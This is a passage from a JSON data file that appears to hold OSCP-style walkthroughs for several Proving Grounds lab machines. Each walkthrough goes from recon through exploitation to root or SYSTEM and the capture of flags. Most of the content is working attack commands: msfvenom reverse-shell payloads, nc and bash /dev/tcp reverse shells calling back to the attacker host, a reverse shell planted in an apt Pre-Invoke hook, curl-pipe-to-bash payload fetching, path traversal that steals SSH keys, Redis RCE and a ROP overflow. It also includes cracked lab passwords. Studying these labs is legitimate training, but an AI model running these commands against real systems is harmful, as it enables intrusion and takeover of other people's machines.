    "h": "Crack Infrastructure.pdf",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "ftp {T}\n# ariah / NowiseSloopTheory139\nbin\nget Infrastructure.pdf\nquit\npdf2john Infrastructure.pdf | tee pdf_hash\njohn pdf_hash --wordlist=/usr/share/wordlists/rockyou.txt"
     },
     {
      "t": "out",
      "v": "ariah4168        (Infrastructure.pdf)\nTemporary Command endpoint: http://nickel/?"
     }
    ]
   },
   {
    "h": "Port 80 only works locally: tunnel it",
    "b": [
     {
      "t": "code",
      "lang": "cmd",
      "v": "netstat -an | findstr LISTENING"
     },
     {
      "t": "out",
      "v": "TCP    0.0.0.0:80     0.0.0.0:0    LISTENING"
     },
     {
      "t": "p",
      "v": "On Kali, forward it and test:"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "sudo ssh -L 80:127.0.0.1:80 ariah@{T}\ncurl http://localhost/?whoami"
     },
     {
      "t": "out",
      "v": "<pre>nt authority\\system</pre>"
     }
    ]
   },
   {
    "h": "SYSTEM shell + proof.txt",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "msfvenom -p windows/x64/shell_reverse_tcp LHOST={K} LPORT=443 -f exe -o payload.exe\nscp payload.exe ariah@{T}:C:/Users/ariah/Desktop/payload.exe\nsudo rlwrap nc -nlvp 443\ncurl -G 'http://localhost/?' --data-urlencode 'cmd /c C:\\Users\\ariah\\Desktop\\payload.exe'"
     },
     {
      "t": "code",
      "lang": "cmd",
      "v": "type C:\\Users\\Administrator\\Desktop\\proof.txt"
     },
     {
      "t": "flag",
      "v": "proof.txt captured 👑"
     },
     {
      "t": "p",
      "v": "💡 To skip the shell: `--data-urlencode 'net localgroup Administrators ariah /add'`."
     }
    ]
   }
  ],
  "takeaways": [
   "📮 \"Cannot GET\" means try **POST** with `-H 'Content-Length: 0'`.",
   "🧾 Process command lines leak secrets, and base64 there is usually a password.",
   "🔒 Locked PDF/ZIP/RAR: use the matching **\\*2john** tool, then rockyou.",
   "🔌 Always run `netstat -an`: firewalled ports are good privesc targets.",
   "🚇 With an SSH login, `ssh -L` brings any internal port to Kali."
  ],
  "setup": {
   "h": "Setup: lab folder + session log",
   "b": [
    {
     "t": "p",
     "v": "Do this first, in every new terminal, so everything you run is **saved for later**:"
    },
    {
     "t": "code",
     "lang": "bash",
     "v": "mkdir -p ~/oscp/nickel/{scans,loot,exploits} && cd ~/oscp/nickel\nscript -a -q session_$(date +%F_%H%M).log      # records everything you type and see\nexport T={T}; echo \"T=$T\" >> notes.txt"
    },
    {
     "t": "list",
     "v": [
      "`script` keeps recording until you type `exit`. Replay it later with `cat session_*.log`.",
      "Save every login the moment you find it: `echo 'user:pass  (where)' >> loot/creds.txt`",
      "Keep the output files of nmap (`-oN`), ffuf (`-o`) and anything piped through `| tee file.txt`.",
      "Take a screenshot of `whoami`, `ipconfig`/`ip a` and each flag: the exam report needs them."
     ]
    }
   ]
  }
 },
 "pgp-dvr4": {
  "title": "Windows · Argus DVR traversal → SSH key → runas Administrator",
  "ips": {
   "K": "192.168.118.14",
   "T": "192.168.120.239"
  },
  "steps": [
   {
    "h": "Recon",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "sudo nmap -sC -sV {T} -oN dvr4_nmap.txt"
     },
     {
      "t": "out",
      "v": "22/tcp open ssh  Bitvise WinSSHD 8.48\n8080/tcp open http |_http-title: Argus Surveillance DVR"
     },
     {
      "t": "p",
      "v": "About.html shows **version 4.0**; Users.html lists **Administrator** and **Viewer**."
     }
    ]
   },
   {
    "h": "Exploit search",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "searchsploit Argus Surveillance DVR 4.0"
     },
     {
      "t": "out",
      "v": "Weak Password Encryption  | windows/local/50130.py\nDirectory Traversal       | windows_x86/webapps/45296.txt"
     }
    ]
   },
   {
    "h": "Directory traversal test",
    "b": [
     {
      "t": "p",
      "v": "The CGI RESULTPAGE parameter is vulnerable. Read a known file first to confirm:"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "curl \"http://{T}:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=../../../../../../../../../../../../../../../../Windows/system.ini&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD=\""
     },
     {
      "t": "out",
      "v": "; for 16-bit app support\n[386Enh]"
     },
     {
      "t": "warn",
      "v": "Each `../` is URL-encoded as `..%2F` in the real request."
     }
    ]
   },
   {
    "h": "Foothold: read viewer's SSH key",
    "b": [
     {
      "t": "p",
      "v": "Point the same traversal at `Users/viewer/.ssh/id_rsa`, save it, and log in:"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "curl \"http://{T}:8080/WEBACCOUNT.CGI?...RESULTPAGE=..%2F..%2F...%2FUsers%2Fviewer%2F%2Essh%2Fid_rsa...\" > id_rsa\nchmod 600 id_rsa\nssh -i id_rsa viewer@{T}"
     },
     {
      "t": "code",
      "lang": "cmd",
      "v": "whoami\ntype C:\\Users\\viewer\\Desktop\\local.txt"
     },
     {
      "t": "out",
      "v": "dvr4\\viewer"
     },
     {
      "t": "flag",
      "v": "local.txt captured"
     }
    ]
   },
   {
    "h": "Find the admin password",
    "b": [
     {
      "t": "code",
      "lang": "cmd",
      "v": "type \"C:\\ProgramData\\PY_Software\\Argus Surveillance DVR\\DVRParams.ini\" | findstr /i \"LoginName Password\""
     },
     {
      "t": "out",
      "v": "LoginName0=Administrator\nPassword0=ECB453D16069F641E03BD9BD956BFE36BD8F3CD9D9A8"
     }
    ]
   },
   {
    "h": "Decode it with EDB-50130",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "searchsploit -m 50130\n# set pass_hash in 50130.py to the value above\npython3 50130.py"
     },
     {
      "t": "out",
      "v": "1 4 W a t c h D 0 g   +  D9A8:Unknown"
     },
     {
      "t": "p",
      "v": "The script can't name special characters. Make a test user in the web UI with a one-character password, read the INI again, and you learn **`$` = D9A8**."
     },
     {
      "t": "p",
      "v": "🔑 Login: **Administrator : 14WatchD0g$**"
     }
    ]
   },
   {
    "h": "Administrator via runas + proof.txt",
    "b": [
     {
      "t": "p",
      "v": "SSH as Administrator is denied, so use runas from viewer's session. On Kali:"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "cp /usr/share/windows-resources/binaries/nc.exe .\npython3 -m http.server 80\nrlwrap nc -lvnp 443"
     },
     {
      "t": "p",
      "v": "In the SSH session:"
     },
     {
      "t": "code",
      "lang": "cmd",
      "v": "mkdir C:\\temp\npowershell -c \"iwr http://{K}/nc.exe -OutFile C:\\temp\\nc.exe\"\nrunas /env /profile /user:DVR4\\Administrator \"C:\\temp\\nc.exe -e cmd.exe {K} 443\"\n# password: 14WatchD0g$"
     },
     {
      "t": "out",
      "v": "dvr4\\administrator"
     },
     {
      "t": "code",
      "lang": "cmd",
      "v": "type C:\\Users\\Administrator\\Desktop\\proof.txt"
     },
     {
      "t": "flag",
      "v": "proof.txt captured 👑"
     }
    ]
   }
  ],
  "takeaways": [
   "📚 Read **every searchsploit result** for the version: one was the foothold, another the privesc.",
   "🔑 If you can read files and SSH is open, grab `C:/Users/<user>/.ssh/id_rsa`.",
   "🗂️ Config files under `C:\\ProgramData` often hold passwords.",
   "🔣 If hash-identifier can't name a \"hash\", it may be an **encoding**. Set known passwords and compare.",
   "🏃 If SSH denies Administrator, use `runas /user:HOST\\Administrator` from an SSH session."
  ],
  "setup": {
   "h": "Setup: lab folder + session log",
   "b": [
    {
     "t": "p",
     "v": "Do this first, in every new terminal, so everything you run is **saved for later**:"
    },
    {
     "t": "code",
     "lang": "bash",
     "v": "mkdir -p ~/oscp/dvr4/{scans,loot,exploits} && cd ~/oscp/dvr4\nscript -a -q session_$(date +%F_%H%M).log      # records everything you type and see\nexport T={T}; echo \"T=$T\" >> notes.txt"
    },
    {
     "t": "list",
     "v": [
      "`script` keeps recording until you type `exit`. Replay it later with `cat session_*.log`.",
      "Save every login the moment you find it: `echo 'user:pass  (where)' >> loot/creds.txt`",
      "Keep the output files of nmap (`-oN`), ffuf (`-o`) and anything piped through `| tee file.txt`.",
      "Take a screenshot of `whoami`, `ipconfig`/`ip a` and each flag: the exam report needs them."
     ]
    }
   ]
  }
 },
 "pgp-flimsy": {
  "title": "Linux · APISIX CVE-2022-24112 → apt Pre-Invoke cron → root",
  "lab": {
   "name": "Flimsy",
   "platform": "PG Practice",
   "os": "Linux"
  },
  "ips": {
   "K": "192.168.29.24",
   "T": "192.168.29.73"
  },
  "steps": [
   {
    "h": "Recon: scan every port",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "echo \"{T} flimsy.com\" | sudo tee -a /etc/hosts\nnmap -Pn -p- -sV -sC -oN flimsy_full.txt flimsy.com"
     },
     {
      "t": "out",
      "v": "22 ssh | 80 nginx | 3306 mysql | 8080 Tomcat 7.0.76\n43500/tcp open http  OpenResty web app server"
     },
     {
      "t": "p",
      "v": "💡 A default scan misses port **43500**; ports 80 and 8080 are dead ends."
     }
    ]
   },
   {
    "h": "Identify APISIX and its version",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "curl http://flimsy.com:43500/\ncurl -I http://flimsy.com:43500/"
     },
     {
      "t": "out",
      "v": "{\"error_msg\":\"404 Route Not Found\"}\nServer: APISIX/2.8"
     },
     {
      "t": "p",
      "v": "APISIX 2.8 is vulnerable to **CVE-2022-24112** (1.3–2.12.1): the batch-requests feature lets you spoof `X-Real-IP: 127.0.0.1`, and the admin key is the default. Together you can add a route that runs `os.execute`."
     }
    ]
   },
   {
    "h": "Foothold: the exploit",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "rlwrap nc -lvnp 445\ngit clone https://github.com/M4xSec/Apache-APISIX-CVE-2022-24112\ncd Apache-APISIX-CVE-2022-24112\npython3 apisix-exploit.py http://flimsy.com:43500/ {K} 445"
     },
     {
      "t": "out",
      "v": "whoami\nfranklin"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "python -c 'import pty;pty.spawn(\"/bin/bash\")'\ncat /home/franklin/local.txt"
     },
     {
      "t": "flag",
      "v": "local.txt captured"
     }
    ]
   },
   {
    "h": "Privesc: check cron",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "cat /etc/crontab\nls -ld /etc/apt/apt.conf.d"
     },
     {
      "t": "out",
      "v": "* * * * * root apt-get update\ndrwxrwxrwx. 1 root root ... /etc/apt/apt.conf.d"
     }
    ]
   },
   {
    "h": "Root via apt Pre-Invoke + proof.txt",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "rlwrap nc -lvnp 1234"
     },
     {
      "t": "p",
      "v": "On the target, drop a hook that runs on the next `apt-get update`:"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "cd /etc/apt/apt.conf.d\necho 'APT::Update::Pre-Invoke {\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {K} 1234 >/tmp/f\"};' > shell"
     },
     {
      "t": "out",
      "v": "# whoami\nroot    (within about a minute)"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "cat /root/proof.txt"
     },
     {
      "t": "warn",
      "v": "The listener port must match the port in the hook."
     },
     {
      "t": "flag",
      "v": "proof.txt captured 👑"
     }
    ]
   }
  ],
  "takeaways": [
   "🔍 Always scan all ports with `-p-`; the way in was on **43500**.",
   "🌐 Search the web for unusual error messages: this JSON one points to APISIX.",
   "🏷️ `curl -I` shows the exact version in the **Server** header.",
   "📦 A root `apt-get` cron + writable `/etc/apt/apt.conf.d` gives root through a **Pre-Invoke** hook.",
   "⏰ Check `/etc/crontab` and run **pspy** early."
  ],
  "setup": {
   "h": "Setup: lab folder + session log",
   "b": [
    {
     "t": "p",
     "v": "Do this first, in every new terminal, so everything you run is **saved for later**:"
    },
    {
     "t": "code",
     "lang": "bash",
     "v": "mkdir -p ~/oscp/flimsy/{scans,loot,exploits} && cd ~/oscp/flimsy\nscript -a -q session_$(date +%F_%H%M).log      # records everything you type and see\nexport T={T}; echo \"T=$T\" >> notes.txt"
    },
    {
     "t": "list",
     "v": [
      "`script` keeps recording until you type `exit`. Replay it later with `cat session_*.log`.",
      "Save every login the moment you find it: `echo 'user:pass  (where)' >> loot/creds.txt`",
      "Keep the output files of nmap (`-oN`), ffuf (`-o`) and anything piped through `| tee file.txt`.",
      "Take a screenshot of `whoami`, `ipconfig`/`ip a` and each flag: the exam report needs them."
     ]
    }
   ]
  }
 },
 "pgp-flower": {
  "title": "Linux · exposed .git → TinyFileManager RCE → SUID overflow → root",
  "lab": {
   "name": "Flower",
   "platform": "PG Practice",
   "os": "Linux"
  },
  "ips": {
   "K": "192.168.120.3",
   "T": "192.168.58.121"
  },
  "steps": [
   {
    "h": "Recon",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "nmap -p- -sV {T} -oN flower_ports.txt\necho \"{T} flower.pg\" | sudo tee -a /etc/hosts"
     },
     {
      "t": "out",
      "v": "22 ssh | 80 http   <title>Welcome to flower.pg!</title>"
     }
    ]
   },
   {
    "h": "vhost fuzzing",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://flower.pg/ -H \"Host: FUZZ.flower.pg\" -fw 104 -o flower_vhosts.md -of md\necho \"{T} files.flower.pg\" | sudo tee -a /etc/hosts"
     },
     {
      "t": "out",
      "v": "files   [Status: 200, Size: 11521]   → TinyFileManager"
     }
    ]
   },
   {
    "h": "Exposed .git",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u \"http://files.flower.pg/FUZZ\" -o flower_dirs.md -of md\ngit-dumper http://files.flower.pg/ flower_git\ncd flower_git\ngit log -p config.php"
     },
     {
      "t": "out",
      "v": ".git  [Status: 301]\n+ 'admin' => '$2y$10$9fI7vPVLpb...8ZahuQK'"
     }
    ]
   },
   {
    "h": "Crack the bcrypt hash",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "echo '$2y$10$9fI7vPVLpb...8ZahuQK' > hash\njohn --wordlist=/usr/share/wordlists/rockyou.txt hash"
     },
     {
      "t": "out",
      "v": "myspace4"
     },
     {
      "t": "p",
      "v": "🔑 Login: **admin : myspace4** (TinyFileManager 2.4.3)"
     }
    ]
   },
   {
    "h": "Foothold: EDB-50828",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "searchsploit -m 50828\n# add the WEB_URL=\"http://files.flower.pg/\" line, then:\nrlwrap bash 50828.sh http://files.flower.pg/ admin myspace4"
     },
     {
      "t": "out",
      "v": "[+] Shell found http://files.flower.pg//shell8679.php\n$> id\nuid=33(www-data)"
     }
    ]
   },
   {
    "h": "Reverse shell",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "echo 'bash -i >& /dev/tcp/{K}/9000 0>&1' > shell.sh\npython3 -m http.server 80\nrlwrap nc -lvnp 9000"
     },
     {
      "t": "p",
      "v": "In the web shell:"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "curl {K}/shell.sh | bash"
     }
    ]
   },
   {
    "h": "Privesc: custom SUID binary",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "find / -type f -perm -4000 2>/dev/null\nfile /usr/local/bin/db-backup"
     },
     {
      "t": "out",
      "v": "/usr/local/bin/db-backup: setuid ELF 64-bit ... stripped"
     },
     {
      "t": "p",
      "v": "In Ghidra: `setuid(0)`, a command built from hex constants, then `scanf(\"%s\")` into a **3-byte** buffer, then `system(cmd)`."
     }
    ]
   },
   {
    "h": "Decode the hardcoded command",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "echo -n 6c71732e...727375 | xxd -r -p | rev"
     },
     {
      "t": "out",
      "v": "/usr/bin/mysqldump -u lucienne --password=svc-dev2019P4SSw0Rd shop 2>/dev/null > /tmp/shop.sql"
     }
    ]
   },
   {
    "h": "Switch to lucienne",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "su lucienne\n# password: svc-dev2019P4SSw0Rd\nfind / -name local.txt 2>/dev/null"
     },
     {
      "t": "flag",
      "v": "local.txt captured"
     }
    ]
   },
   {
    "h": "Root: overflow into system()",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "printf '#!/bin/bash\\nchmod u+s /bin/bash\\n' > /tmp/e\nchmod 777 /tmp/e\ndb-backup\ndb-backup\n# at the overwrite? [Yes][No]: prompt type   Yes$(/tmp/e)\nbash -p\ncat /root/proof.txt"
     },
     {
      "t": "out",
      "v": "-rwsr-xr-x 1 root root ... /bin/bash\nbash-5.0# whoami\nroot"
     },
     {
      "t": "warn",
      "v": "Run db-backup twice: the prompt only shows when the backup already exists. Type it with no spaces."
     },
     {
      "t": "flag",
      "v": "proof.txt captured 👑"
     }
    ]
   }
  ],
  "takeaways": [
   "🌐 If the page source shows a domain, add it to /etc/hosts and **fuzz for vhosts**.",
   "🗃️ An exposed `.git` means `git-dumper` then `git log -p`: secrets hide in old commits.",
   "🔐 `$2y$` hashes are **bcrypt**: hashcat `-m 3200`, slow but it cracks.",
   "🛠️ Public exploit scripts often need a URL or path fixed, so read them first.",
   "🧬 A custom SUID binary in `/usr/local/bin` is worth reversing; decode stack strings with `xxd -r -p | rev`.",
   "💥 A tiny scanf buffer next to `system()` lets you overwrite it with `$(cmd)`."
  ],
  "setup": {
   "h": "Setup: lab folder + session log",
   "b": [
    {
     "t": "p",
     "v": "Do this first, in every new terminal, so everything you run is **saved for later**:"
    },
    {
     "t": "code",
     "lang": "bash",
     "v": "mkdir -p ~/oscp/flower/{scans,loot,exploits} && cd ~/oscp/flower\nscript -a -q session_$(date +%F_%H%M).log      # records everything you type and see\nexport T={T}; echo \"T=$T\" >> notes.txt"
    },
    {
     "t": "list",
     "v": [
      "`script` keeps recording until you type `exit`. Replay it later with `cat session_*.log`.",
      "Save every login the moment you find it: `echo 'user:pass  (where)' >> loot/creds.txt`",
      "Keep the output files of nmap (`-oN`), ffuf (`-o`) and anything piped through `| tee file.txt`.",
      "Take a screenshot of `whoami`, `ipconfig`/`ip a` and each flag: the exam report needs them."
     ]
    }
   ]
  }
 },
 "pgp-internal": {
  "title": "Windows · MS09-050 SMBv2 → direct SYSTEM",
  "lab": {
   "name": "Internal",
   "platform": "PG Practice",
   "os": "Windows"
  },
  "ips": {
   "K": "192.168.49.103",
   "T": "192.168.103.40"
  },
  "steps": [
   {
    "h": "Recon",
    "b": [
     {
      "t": "p",
      "v": "Server 2008 SP1. The exploit lands as SYSTEM, so there is **no privesc step**."
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "nmap -p- --min-rate 3000 {T} -oN internal_ports.txt"
     },
     {
      "t": "out",
      "v": "53 dns | 135 | 139 | 445 smb | 3389 rdp | 5357 | 49152-49158 rpc"
     }
    ]
   },
   {
    "h": "Fingerprint SMB",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "nmap -sC -sV -p139,445 {T} -oN internal_smb.txt"
     },
     {
      "t": "out",
      "v": "445/tcp open microsoft-ds  Windows Server (R) 2008 Standard 6001 Service Pack 1\n|_ message_signing: disabled"
     }
    ]
   },
   {
    "h": "Check for SMB vulns",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "nmap --script 'smb-vuln*' -p445 {T} -oN internal_smbvuln.txt"
     },
     {
      "t": "out",
      "v": "| smb-vuln-cve2009-3103:\n|   SMBv2 (CVE-2009-3103, MS Advisory 975497)\n|     State: VULNERABLE"
     }
    ]
   },
   {
    "h": "Exploit MS09-050",
    "b": [
     {
      "t": "code",
      "lang": "msf",
      "v": "msfconsole -q\nuse exploit/windows/smb/ms09_050_smb2_negotiate_func_index\nset RHOSTS {T}\nset LHOST {K}\nrun"
     },
     {
      "t": "out",
      "v": "[*] Waiting up to 180 seconds for exploit to trigger...\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM"
     },
     {
      "t": "warn",
      "v": "It can take up to 3 minutes. If it fails, revert the box: a failed try can crash SMB."
     }
    ]
   },
   {
    "h": "proof.txt",
    "b": [
     {
      "t": "code",
      "lang": "cmd",
      "v": "shell\nwhoami\ntype C:\\Users\\Administrator\\Desktop\\proof.txt"
     },
     {
      "t": "flag",
      "v": "proof.txt captured 👑"
     }
    ]
   },
   {
    "h": "Without Metasploit",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "searchsploit ms09-050\nmsfvenom -p windows/shell_reverse_tcp LHOST={K} LPORT=443 EXITFUNC=thread -f python -v shell\nnc -lvnp 443"
     },
     {
      "t": "p",
      "v": "Paste the generated shellcode into the python PoC from searchsploit, then run it against {T}. Most copies need python2."
     }
    ]
   }
  ],
  "takeaways": [
   "🏷️ Note the exact OS build: **6001 SP1** means a Server 2008-era bug.",
   "🔎 On old Windows, always run `nmap --script 'smb-vuln*' -p445`.",
   "🗓️ Which bug fits which OS: **MS08-067** XP/2003, **MS09-050** Vista/2008, **MS17-010** Win7/2008 R2/2012.",
   "👑 An RCE in the kernel or a service gives SYSTEM, so there is no privesc step.",
   "🎯 You may only use Metasploit on one exam machine, so know the manual way too."
  ],
  "setup": {
   "h": "Setup: lab folder + session log",
   "b": [
    {
     "t": "p",
     "v": "Do this first, in every new terminal, so everything you run is **saved for later**:"
    },
    {
     "t": "code",
     "lang": "bash",
     "v": "mkdir -p ~/oscp/internal/{scans,loot,exploits} && cd ~/oscp/internal\nscript -a -q session_$(date +%F_%H%M).log      # records everything you type and see\nexport T={T}; echo \"T=$T\" >> notes.txt"
    },
    {
     "t": "list",
     "v": [
      "`script` keeps recording until you type `exit`. Replay it later with `cat session_*.log`.",
      "Save every login the moment you find it: `echo 'user:pass  (where)' >> loot/creds.txt`",
      "Keep the output files of nmap (`-oN`), ffuf (`-o`) and anything piped through `| tee file.txt`.",
      "Take a screenshot of `whoami`, `ipconfig`/`ip a` and each flag: the exam report needs them."
     ]
    }
   ]
  }
 },
 "pgp-blackgate": {
  "title": "Linux · Redis rogue server → sudo redis-status ROP → root",
  "lab": {
   "name": "BlackGate",
   "platform": "PG Practice",
   "os": "Linux"
  },
  "ips": {
   "K": "192.168.118.23",
   "T": "192.168.120.118"
  },
  "steps": [
   {
    "h": "Recon",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "nmap -sV -p- -Pn {T} -oN blackgate_ports.txt"
     },
     {
      "t": "out",
      "v": "22/tcp open ssh    OpenSSH 8.3p1 Ubuntu\n6379/tcp open redis  Redis 4.0.14"
     }
    ]
   },
   {
    "h": "Redis needs no password",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "redis-cli -h {T}\nping\nINFO SERVER"
     },
     {
      "t": "out",
      "v": "PONG\nredis_version:4.0.14"
     }
    ]
   },
   {
    "h": "Foothold: rogue-server RCE",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "git clone https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server\ncd Awsome-Redis-Rogue-Server\npython3 redis_rogue_server.py -rhost {T} -lhost {K}\n# choose: i\nrlwrap nc -lvnp 4422"
     },
     {
      "t": "p",
      "v": "In the module shell:"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "bash -c 'bash -i >& /dev/tcp/{K}/4422 0>&1'"
     },
     {
      "t": "out",
      "v": "prudence@blackgate:/tmp$"
     }
    ]
   },
   {
    "h": "SSH key + local.txt",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "ssh-keygen -t rsa -f ./bg_key -N ''\ncat bg_key.pub"
     },
     {
      "t": "p",
      "v": "On the target, add the public key:"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "mkdir -p ~/.ssh\necho 'PASTE_bg_key.pub' >> ~/.ssh/authorized_keys\nchmod 600 ~/.ssh/authorized_keys\ncat ~/local.txt"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "ssh -i bg_key prudence@{T}"
     },
     {
      "t": "flag",
      "v": "local.txt captured"
     }
    ]
   },
   {
    "h": "Privesc: enumerate",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "sudo -l"
     },
     {
      "t": "out",
      "v": "(root) NOPASSWD: /usr/local/bin/redis-status"
     }
    ]
   },
   {
    "h": "Reverse redis-status",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "scp -i bg_key prudence@{T}:/usr/local/bin/redis-status .\ngdb -q ./redis-status\ndisas main"
     },
     {
      "t": "out",
      "v": "call gets@plt   ; buffer at rbp-0x100"
     },
     {
      "t": "p",
      "v": "💡 The bug is **gets()**: offset = 0x100 + 8 = **264**. NX on, PIE off, so use **ROP**."
     }
    ]
   },
   {
    "h": "Gadgets",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "checksec redis-status\nropper --file redis-status --search 'pop rdi; ret'\nreadelf -S redis-status | grep -A1 bss"
     },
     {
      "t": "out",
      "v": "0x4012e3: pop rdi; ret;   |  .bss 0x404050 (WA)\ngets@plt 0x4010d0  |  system@plt 0x4010a0"
     }
    ]
   },
   {
    "h": "Build the payload (on the target)",
    "b": [
     {
      "t": "p",
      "v": "Pad 264 bytes, then chain `pop rdi; ret` + gets@plt to write \"/bin/sh\" into .bss, then `pop rdi` + system@plt on that address:"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "python3 build_payload.py > /tmp/xploit.txt"
     },
     {
      "t": "warn",
      "v": "If it crashes inside system(), add the `ret` gadget `q(0x4012e4)` right before `q(system)`."
     }
    ]
   },
   {
    "h": "Root + proof.txt",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "(cat /tmp/xploit.txt; cat -) | sudo /usr/local/bin/redis-status\n/bin/sh\nid\ncat /root/proof.txt"
     },
     {
      "t": "out",
      "v": "uid=0(root) gid=0(root)"
     },
     {
      "t": "p",
      "v": "💡 Shortcut: Ubuntu 20.10 / kernel 5.8 is often open to PwnKit (CVE-2021-4034). Check `ls -l /usr/bin/pkexec`."
     },
     {
      "t": "flag",
      "v": "proof.txt captured 👑"
     }
    ]
   }
  ],
  "takeaways": [
   "🗄️ Redis on 6379 with no password, version 4.x/5.x → **rogue-server** module RCE.",
   "🔑 Module shells are limited: switch to a reverse shell, then add an SSH key.",
   "🧩 If sudo allows a custom binary, copy it to Kali and reverse it (`disas main`, `x/s`).",
   "💥 `gets()` means an overflow. Offset = buffer size + 8.",
   "⛓️ NX on, PIE off: chain `pop rdi; ret` with gets@plt to write \"/bin/sh\", then call system@plt.",
   "🔁 `(cat payload; cat -) | sudo BIN` keeps the shell open."
  ],
  "setup": {
   "h": "Setup: lab folder + session log",
   "b": [
    {
     "t": "p",
     "v": "Do this first, in every new terminal, so everything you run is **saved for later**:"
    },
    {
     "t": "code",
     "lang": "bash",
     "v": "mkdir -p ~/oscp/blackgate/{scans,loot,exploits} && cd ~/oscp/blackgate\nscript -a -q session_$(date +%F_%H%M).log      # records everything you type and see\nexport T={T}; echo \"T=$T\" >> notes.txt"
    },
    {
     "t": "list",
     "v": [
      "`script` keeps recording until you type `exit`. Replay it later with `cat session_*.log`.",
      "Save every login the moment you find it: `echo 'user:pass  (where)' >> loot/creds.txt`",
      "Keep the output files of nmap (`-oN`), ffuf (`-o`) and anything piped through `| tee file.txt`.",
      "Take a screenshot of `whoami`, `ipconfig`/`ip a` and each flag: the exam report needs them."
     ]
    }
   ]
  }
 }
};
